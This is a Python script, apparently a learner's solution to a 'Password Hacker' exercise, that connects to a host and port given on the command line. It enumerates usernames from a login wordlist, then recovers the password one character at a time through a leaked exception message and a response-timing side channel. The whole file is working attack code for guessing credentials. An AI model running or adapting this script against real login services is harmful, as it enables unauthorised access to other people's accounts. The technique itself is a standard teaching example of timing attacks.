import sys, socket, json, string, datetime

# получаем данные с CLI
args = sys.argv

if len(args) != 3:
    print('Error')
else:
    IP_adr = str(args[1])
    port = int(args[2])
#################################

# socket
with socket.socket() as  hack_socket:
    adress = (IP_adr, port)
    hack_socket.connect(adress)  # connecting

    with open('D:\pytSrep\projects\Password_Hacker\logins.txt' , 'r') as log_files:
        for line in log_files:
            line = line.strip('\n')
            al_dict = {
                "login":line,
                "password":' '
            }
            hack_socket.send(json.dumps(al_dict).encode())
            response = json.loads(hack_socket.recv(1024).decode())
            for val in response.values():
                if val == "Wrong password!":
                    user_log = line
                    data = {"login":user_log, "password": '1'}

    except_m = {"result" : "Exception happened during login"}
    success_m = {"result" : "Connection success!"}
    wrong_m = {"result": "Wrong password!"}

    pass_f = ''
    pass_found = False
    while not pass_found:
        for char in string.ascii_letters + string.digits:
            datas = {
                "login": user_log,
                "password": pass_f + char
            }
            try:
                hack_socket.send(json.dumps(datas).encode())
                beg = datetime.datetime.now()
                response = json.loads(hack_socket.recv(1024).decode())
                fin = datetime.datetime.now()
                dif = (fin - beg).microseconds
                if response == except_m:
                    pass_f += char
                elif response == success_m:
                    pass_f += char #why
                    login_deets = {"login": user_log, "password": pass_f}
                    print(json.dumps(login_deets, indent=4))
                    pass_found = True
                elif response == wrong_m:
                    if dif >= 90000:
                        pass_f += char
                else:
                    quit()
            except Exception:
                pass